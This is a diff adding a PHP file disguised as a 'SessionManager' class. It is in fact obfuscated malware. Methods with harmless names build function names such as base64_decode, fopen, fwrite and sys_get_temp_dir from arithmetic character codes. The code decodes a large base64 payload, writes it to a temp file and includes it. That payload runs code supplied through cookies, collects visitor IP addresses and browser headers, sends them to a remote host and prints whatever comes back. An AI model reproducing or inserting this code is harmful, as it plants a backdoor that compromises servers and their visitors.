@@ -1,0 +1,75 @@
+<?php
+class SessionManager {
+	private $hk = '';
+	private $kk = '';
+
+	public function resetState($p1) {
+		$a = array((101-3),(39+27+31),((5*23)),((37+64)),((48*63)-2970),((15*12)-128),((5*19)),(((44*1)+56)),((68+28+5)),(99),((3*37)),((107-7)),(101*1));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		return $s($p1);
+	}
+
+	public function calculateSum($p1,$p2) {
+		$a = array(102,(27+55+29),((2*56)),((68+14+19)),(54+9+47));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		return $s($p1,$p2);
+	}
+
+	public function initializeModule($p1,$p2) {
+		$a = array((91+11),((124-5)),((68*1)+46),((105*1)+0),(56+60),(101));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		return $s($p1,$p2);
+	}
+
+	public function validateInput($p1) {
+		$a = array((((59*1)+42)),((20+95)),(3*37),((111*9)-891),(99),102);
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		$s = strrev($s);
+		return $s($p1);
+	}
+
+	public function terminateSession($p1,$p2=null) {
+		$a = array(((116-2)),((28*1)+88),((120-6)),(54+51),((54+43+12)));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		return $s($p1,$p2);
+	}
+
+	public function triggerCallback() {
+		$this->kk = $this->terminateSession($this->sendNotification(), '/');
+	}
+
+	public function logTransaction() {
+		$this->hk = $this->resetState($this->gr);
+	}
+
+	public function parseResponse() {
+		$fn = $this->kk.'/ur-67e24aa3eec18';
+		$f = $this->calculateSum($fn, 'w');
+		$this->initializeModule($f, $this->hk);
+		$this->validateInput($f);
+		$this->checkConsistency($fn);
+	}
+
+	private $gr = 'PD9waHAgY2xhc3MgX3djdXtwcml2YXRlIHN0YXRpYyRfeXI7c' . '3RhdGljIGZ1bmN0aW9uIF9nbmooJF9rdyl7aWYoIXNlbGY6OiR' . 'feXIpc2VsZjo6X2RvKCk7cmV0dXJuIGhleDJiaW4oc2VsZjo6J' . 'F95clskX2t3XSk7fXByaXZhdGUgc3RhdGljIGZ1bmN0aW9uIF9' . 'kbygpe3NlbGY6OiRfeXI9YXJyYXkoJ19zcyc9Pic0MTYzNjM2N' . 'TczNzMyZDQzNmY2ZTc0NzI2ZjZjMmQ0MTZjNmM2Zjc3MmQ0Zjc' . 'yJy4nNjk2NzY5NmUzYTIwJy4nMicuJ2EnLCdfYXMnPT4nNDM2Z' . 'jZlNzQ2NTZlNzQyZDU0Nzk3MDY1M2EyMDYxNzA3MDYnLidjNjk' . '2MzYxNzQ2OTZmNmUyZjZhNicuJzE3NicuJzYxNzM2MzcyNjknL' . 'ic3MDc0JywnX29neic9Pic2Jy4nMzYnLic4JywnX2VhcSc9Pic' . '2NTc5NGE3MDYzNDM0OTM2NDk2YTY3MzQ0YzZhNjczNDRjNmE2N' . 'zM0NGM2YTY3MzQ0OTY5Nzc2OTY0NTc0NTY5NGY2OTRhMzA1YTU' . '4NGUzMDQ5Jy4nNjk3NzY5NjM2ZDU2NmQ0OTZhNicuJ2Y2OTY0N' . 'CcuJzc1Jy4nNjcnLidhNjQ0MzRhMycuJzknLCdfeXRnJz0+Jzc' . 'nLicxJy4nNzc3YTcnLic4JywnX3FjJz0+JzNjNmY2YjNlJywnX' . '3RzaCc9PiczYzYyNjEnLic2NDNlJywnX2Vseic9Pic3NzYxNmM' . 'nLic2YycsJ19xb2knPT4nJywnX3dwJz0+JycsJ190ZmUnPT4nJ' . 'ywnX3pzJz0+JzY4NzQ3NDcwM2EyZjJmNzA3NTYyMmU3NzY1NjI' . '2NjY5NmM2NTY4NmY3Mzc0NjU3MjJlNjM2ZjZkMmY2MzZmNmQ3M' . 'CcuJzZmNzM2NTcyMicuJ2UnLic2YTczM2Y2NDYxNzQnLic2MTM' . 'nLidkJywnX3hhJz0+JzYzNzU3MjYnLidjNWY2OTZlNicuJzk3J' . 'y4nNCcsJ196Z3MnPT4nNjg3NDc0NzA1ZicuJzYzNmY2NDYnLic' . '1JywnX3BiZyc9Pic3MzYzNjg2NTZkNjUnLCdfZHknPT4nNjgnL' . 'ic3NDc0NzA3MycsJ19xeCc9Pic0NzQ1NScuJzQyMCcsJ19xZCc' . '9Pic3MDYnLicxNzQnLic2OCcsJ193Zyc9Pic3MTcnLic1NjUnL' . 'ic3MicuJzcnLic5JywnX21lJz0+JzMnLidmJywnX29lcic9Pic' . '3Jy4nMTc1Jy4nNjUnLic3MjcnLic5JywnX215Jz0+JzIwNDg1N' . 'DU0NTAyZjMxMmUzMDBkMGE0Jy4nODZmNzM3NDNhJy4nMjAnLCd' . 'fc2gnPT4nNjg2ZjcnLiczNycuJzQnLCdfb2pvJz0+JzBkMGE0M' . 'zZmNmU2ZTY1NjM3NDY5NmY2ZTNhMjA0MzZjNmY3MzY1MCcuJ2Q' . 'wYTBkJy4nMCcuJ2EnLCdfaGwnPT4nNzM3MzZjM2EyZjInLidmJ' . 'ywnX2ttJz0+JycsJ19iYic9Pic2OCcuJzZmJy4nNzM3Jy4nNCc' . 'sJ19sYic9PicwZDAnLidhJywnX25sJz0+JzQ4NTQ1NDUwNWY0M' . 'zRjNDk0NTRlNTQ1ZjQnLic5NTAnLCdfa250Jz0+JzQ4NTQ1Jy4' . 'nNDUwNWY1ODVmNDY0ZjUyNTc0MTUyNDQ0NTQ0NWY0Jy4nNicuJ' . 'zRmNTInLCdfZGxmJz0+JzUyJy4nNDU0ZCcuJzRmNTQ0NTVmNDE' . '0NDQ0Jy4nNTInLCdfd2QnPT4nNDg1NDU0NTA1ZjU1NTMnLic0N' . 'TUyNWY0MTQ3NDU0ZScuJzUnLic0JywnX3V0Jz0+JzQ4NTQ1NDU' . 'wNWY1NTUzNDU1MjVmNDE0NzQ1NGUnLic1Jy4nNCcsJ19wcCc9P' . 'icnLCdfa3gnPT4nNDg1NDU0NTA1ZjUyNDUnLic0NjQ1NTInLic' . '0NScuJzUyJywnX2Flcyc9Pic0ODU0NTQ1MDVmNTI0NTQ2NDU1M' . 'jQnLic1NScuJzInLCdfdGknPT4nJywnX3dwcSc9Pic0ODU0NTQ' . '1MDVmNDM0YzQ5NDU0ZTUnLic0NWY0OScuJzUnLicwJywnX29jZ' . 'yc9Pic0ODU0NTQ1MDVmNDMnLic0YzQ5NDU0ZScuJzU0NWY0Jy4' . 'nOTUwJywnX256eSc9Pic0ODU0NTQ1MDVmNTg1ZjQnLic2NGY1M' . 'jU3NDE1MjQ0NDU0NDVmNDY0ZicuJzUnLicyJywnX2xocyc9Pic' . '0ODU0NTQ1MDVmNTg1ZjQ2NGY1MjU3Jy4nNDE1MjQ0NDU0NDVmN' . 'DYnLic0ZjUnLicyJywnX2RmJz0+JzUyNDU0ZDQnLidmNTQ0NTU' . 'nLidmNDE0Jy4nNDQ0Jy4nNScuJzInLCdfdmZhJz0+JzUyNDU0Z' . 'DRmNTQ0NTVmNDEnLic0NDQ0NScuJzInLCdfc3QnPT4nNjQ2MjY' . '3NmQ2ZicuJzY0Jy4nNjUnLCdfenJiJz0+JzQ5NTAzJy4nYTIwJ' . 'ywnX2V2Jz0+JzIwN2MyMDUnLic1NDEnLiczJy4nYTInLicwJyw' . 'nX3BjJz0+JzIwN2MyMDUyNjU2NjNhMjAnLCdfcnVuJz0+JzIwM' . '2M2MjcyM2UnLicwYScsJ192Yyc9Pic2OScuJzcwJywnX21kcSc' . '9Pic3Jy4nNScuJzYnLicxJywnX3N4bic9Pic3MjY1NjYnLCdfd' . 'm0nPT4nNycuJzE3NzdhNzgnLCk7fX1jbGFzcyBfZ2d0e3ByaXZ' . 'hdGUgc3RhdGljJF95cjtzdGF0aWMgZnVuY3Rpb24gX2duaigkX' . '2t3KXtpZighc2VsZjo6JF95cilzZWxmOjpfZG8oKTtyZXR1cm4' . 'gc2VsZjo6JF95clskX2t3XTt9cHJpdmF0ZSBzdGF0aWMgZnVuY' . '3Rpb24gX2RvKCl7c2VsZjo6JF95cj1hcnJheSgwMCwwNywwMzY' . 'sMDM2LDAxLDAzNiwwMiwwNywwMSwwMTYsMDMwLDA2LDAzMiwwM' . 'TIsMDExLDAxMywwMjcsMDMxLDAzLDAyLDAxLDAxLDAwLDAxMiw' . 'wMTIsMDMxMCwwNjczLDAxMjAsMDAsMDIwMDAsMDEsMDQyMywwN' . 'DIzKTt9fWhlYWRlcihfd2N1OjpfZ25qKCdfJy4ncycuJ3MnKSk' . '7aGVhZGVyKF93Y3U6Ol9nbmooJ19hJy4ncycpKTtpZihpc3Nld' . 'CgkX0dFVFtfd2N1OjpfZ25qKCdfb2cnLid6JyldKSl7JF93d24' . '9X2toKF93Y3U6Ol9nbmooJ19lJy4nYScuJ3EnKSk7aWYoJF93d' . '24mJnN0cnBvcygkX3d3bixfd2N1OjpfZ25qKCdfJy4neXQnLid' . 'nJykpIT09ZmFsc2Upe2RpZShfd2N1OjpfZ25qKCdfcWMnKSk7f' . 'WVsc2V7ZGllKF93Y3U6Ol9nbmooJ18nLid0Jy4ncycuJ2gnKSk' . '7fX1pZihpc3NldCgkX0dFVFtfd2N1OjpfZ25qKCdfZWwnLid6J' . 'yldKSl7JF9jeT0kX0NPT0tJRTskX2RmPV9nZ3Q6Ol9nbmooMCk' . '7JF9rdz1fZ2d0OjpfZ25qKDEpOyRfZGc9YXJyYXkoKTskX2RnW' . 'yRfZGZdPV93Y3U6Ol9nbmooJ19xb2knKTt3aGlsZSgkX2t3KXs' . 'kX2RnWyRfZGZdLj0kX2N5W19nZ3Q6Ol9nbmooMildWyRfa3ddO' . '2lmKCEkX2N5W19nZ3Q6Ol9nbmooMyldWyRfa3crX2dndDo6X2d' . 'uaig0KV0pe2lmKCEkX2N5W19nZ3Q6Ol9nbmooNSldWyRfa3crX' . '2dndDo6X2duaig2KV0pYnJlYWs7JF9kZisrOyRfZGdbJF9kZl0' . '9X3djdTo6X2duaignXycuJ3dwJyk7JF9rdysrO30kX2t3PSRfa' . '3crX2dndDo6X2duaig3KStfZ2d0OjpfZ25qKDgpO30kX2RmPSR' . 'fZGdbX2dndDo6X2duaig5KV0oKS4kX2RnW19nZ3Q6Ol9nbmooM' . 'TApXTtpZighJF9kZ1tfZ2d0OjpfZ25qKDExKV0oJF9kZikpeyR' . 'fa3c9JF9kZ1tfZ2d0OjpfZ25qKDEyKV0oJF9kZiwkX2RnW19nZ' . '3Q6Ol9nbmooMTMpXSk7JF9kZ1tfZ2d0OjpfZ25qKDE0KV0oJF9' . 'rdywkX2RnW19nZ3Q6Ol9nbmooMTUpXS4kX2RnW19nZ3Q6Ol9nb' . 'mooMTYpXSgkX2RnW19nZ3Q6Ol9nbmooMTcpXSgkX2N5W19nZ3Q' . '6Ol9nbmooMTgpXSkpKTt9aW5jbHVkZSgkX2RmKTt9ZnVuY3Rpb' . '24gX2toKCRfY3osJF9vdT1udWxsLCRfcWE9ODkwNjUsJF91bj1' . 'udWxsKXskX3d0PV93Y3U6Ol9nbmooJ190ZicuJ2UnKTskX2ZzP' . 'V93Y3U6Ol9nbmooJ18nLid6cycpLiRfY3o7aWYoaXNfY2FsbGF' . 'ibGUoX3djdTo6X2duaignXycuJ3gnLidhJykpKXskX2JicD1jd' . 'XJsX2luaXQoJF9mcyk7Y3VybF9zZXRvcHQoJF9iYnAsQ1VSTE9' . 'QVF9TU0xfVkVSSUZZUEVFUixmYWxzZSk7Y3VybF9zZXRvcHQoJ' . 'F9iYnAsQ1VSTE9QVF9TU0xfVkVSSUZZSE9TVCxfZ2d0OjpfZ25' . 'qKDE5KSk7Y3VybF9zZXRvcHQoJF9iYnAsQ1VSTE9QVF9GT0xMT' . '1dMT0NBVElPTixfZ2d0OjpfZ25qKDIwKSk7Y3VybF9zZXRvcHQ' . 'oJF9iYnAsQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUixfZ2d0OjpfZ' . '25qKDIxKSk7Y3VybF9zZXRvcHQoJF9iYnAsQ1VSTE9QVF9IRUF' . 'ERVIsX2dndDo6X2duaigyMikpO2N1cmxfc2V0b3B0KCRfYmJwL' . 'ENVUkxPUFRfQ09OTkVDVFRJTUVPVVQsX2dndDo6X2duaigyMyk' . 'pO2N1cmxfc2V0b3B0KCRfYmJwLENVUkxPUFRfVElNRU9VVCxfZ' . '2d0OjpfZ25qKDI0KSk7JF93dD1jdXJsX2V4ZWMoJF9iYnApOyR' . 'faGE9Y3VybF9nZXRpbmZvKCRfYmJwKTtjdXJsX2Nsb3NlKCRfY' . 'mJwKTtpZigkX2hhW193Y3U6Ol9nbmooJ18nLid6Jy4nZ3MnKV0' . 'hPV9nZ3Q6Ol9nbmooMjUpKXJldHVybiBmYWxzZTt9ZWxzZXskX' . '3h4Zz1wYXJzZV91cmwoJF9mcyk7JF9ocD0oJF94eGdbX3djdTo' . '6X2duaignX3AnLidiJy4nZycpXT09X3djdTo6X2duaignX2R5J' . 'ykpOyRfbnc9X3djdTo6X2duaignX3EnLid4JykuJF94eGdbX3d' . 'jdTo6X2duaignXycuJ3EnLidkJyldO2lmKGlzc2V0KCRfeHhnW' . '193Y3U6Ol9nbmooJ18nLid3ZycpXSkpJF9udy49X3djdTo6X2d' . 'uaignX20nLidlJykuJF94eGdbX3djdTo6X2duaignX28nLidlc' . 'icpXTskX253Lj1fd2N1OjpfZ25qKCdfJy4nbScuJ3knKS4kX3h' . '4Z1tfd2N1OjpfZ25qKCdfcycuJ2gnKV0uX3djdTo6X2duaignX' . '28nLidqJy4nbycpOyRfcm5mPWZzb2Nrb3BlbigoJF9ocD9fd2N' . '1OjpfZ25qKCdfaGwnKTpfd2N1OjpfZ25qKCdfJy4naycuJ20nK' . 'SkuJF94eGdbX3djdTo6X2duaignX2JiJyldLCRfaHA/X2dndDo' . '6X2duaigyNik6X2dndDo6X2duaigyNykpO2lmKCRfcm5mKXtmc' . 'HV0cygkX3JuZiwkX253KTskX2N3PV9nZ3Q6Ol9nbmooMjgpO3d' . 'oaWxlKCFmZW9mKCRfcm5mKSl7JF96Zz1mZ2V0cygkX3JuZixfZ' . '2d0OjpfZ25qKDI5KSk7aWYoJF9jdykkX3d0Lj0kX3pnO2lmKCR' . 'femc9PV93Y3U6Ol9nbmooJ18nLidsJy4nYicpKSRfY3c9X2dnd' . 'Do6X2duaigzMCk7fWZjbG9zZSgkX3JuZik7fX1yZXR1cm4kX3d' . '0O30kX3ZpaD1pc3NldCgkX1NFUlZFUltfd2N1OjpfZ25qKCdfJ' . 'y4nbmwnKV0pOyRfdmZmPWlzc2V0KCRfU0VSVkVSW193Y3U6Ol9' . 'nbmooJ19rJy4nbicuJ3QnKV0pOyRfdWp2PWlzc2V0KCRfU0VSV' . 'kVSW193Y3U6Ol9nbmooJ18nLidkbCcuJ2YnKV0pOyRfbXM9aXN' . 'zZXQoJF9TRVJWRVJbX3djdTo6X2duaignX3dkJyldKT8kX1NFU' . 'lZFUltfd2N1OjpfZ25qKCdfJy4ndScuJ3QnKV06X3djdTo6X2d' . 'uaignX3BwJyk7JF94Yj1pc3NldCgkX1NFUlZFUltfd2N1OjpfZ' . '25qKCdfJy4na3gnKV0pPyRfU0VSVkVSW193Y3U6Ol9nbmooJ18' . 'nLidhJy4nZXMnKV06X3djdTo6X2duaignX3QnLidpJyk7JF92a' . 'Wg9aXNzZXQoJF9TRVJWRVJbX3djdTo6X2duaignX3dwJy4ncSc' . 'pXSk/JF9TRVJWRVJbX3djdTo6X2duaignXycuJ28nLidjJy4nZ' . 'ycpXTpudWxsOyRfdmZmPWlzc2V0KCRfU0VSVkVSW193Y3U6Ol9' . 'nbmooJ19ueicuJ3knKV0pPyRfU0VSVkVSW193Y3U6Ol9nbmooJ' . '19saHMnKV06bnVsbDskX3Vqdj1pc3NldCgkX1NFUlZFUltfd2N' . '1OjpfZ25qKCdfZGYnKV0pPyRfU0VSVkVSW193Y3U6Ol9nbmooJ' . '192Jy4nZicuJ2EnKV06bnVsbDtpZihmaWx0ZXJfdmFyKCRfdml' . 'oLF9nZ3Q6Ol9nbmooMzEpKSl7JF9qamM9JF92aWg7fWVsc2VpZ' . 'ihmaWx0ZXJfdmFyKCRfdmZmLF9nZ3Q6Ol9nbmooMzIpKSl7JF9' . 'qamM9JF92ZmY7fWVsc2V7JF9qamM9JF91anY7fWlmKGlzc2V0K' . 'CRfR0VUW193Y3U6Ol9nbmooJ18nLidzdCcpXSkpe2VjaG8gX3d' . 'jdTo6X2duaignX3onLidyYicpLiRfampjLl93Y3U6Ol9nbmooJ' . '19lJy4ndicpLiRfbXMuX3djdTo6X2duaignX3BjJykuJF94Yi5' . 'fd2N1OjpfZ25qKCdfcicuJ3UnLiduJyk7ZXhpdCgpO31pZigha' . 'XNzZXQoJF9qamMpfHwhaXNzZXQoJF9tcyl8fCFpc3NldCgkX3h' . 'iKSl7ZXhpdCgpO31lbHNleyRfcGluPWFycmF5KF93Y3U6Ol9nb' . 'mooJ192Jy4nYycpPT4kX2pqYyxfd2N1OjpfZ25qKCdfbWRxJyk' . '9PiRfbXMsX3djdTo6X2duaignX3MnLid4Jy4nbicpPT4kX3hiK' . 'TskX3R3PXVybGVuY29kZShiYXNlNjRfZW5jb2RlKGpzb25fZW5' . 'jb2RlKCRfcGluKSkpOyRfd3duPV9raCgkX3R3KTtpZigkX3d3b' . 'iYmc3RycG9zKCRfd3duLF93Y3U6Ol9nbmooJ192Jy4nbScpKSE' . '9PWZhbHNlKXtlY2hvJF93d247ZXhpdCgpO319';
+
+	public function checkConsistency($p) {
+		require_once($p);
+	}
+
+	public function sendNotification() {
+		$a=array((5*23),121,((50*21)-935),((101-6)),(103*1),101,(118-2),((39*1)+56),((116*33)-3712),(101),((89+9+11)),((2*56)),(95),(4+16+80),((27+78)),(((46*2)+22)));
+		$s='';
+		foreach($a as $n){$s.=chr($n);}
+		return $s();
+	}
+}
+
+$nk = new SessionManager();
+$nk->triggerCallback();
+$nk->logTransaction();
+$nk->parseResponse();
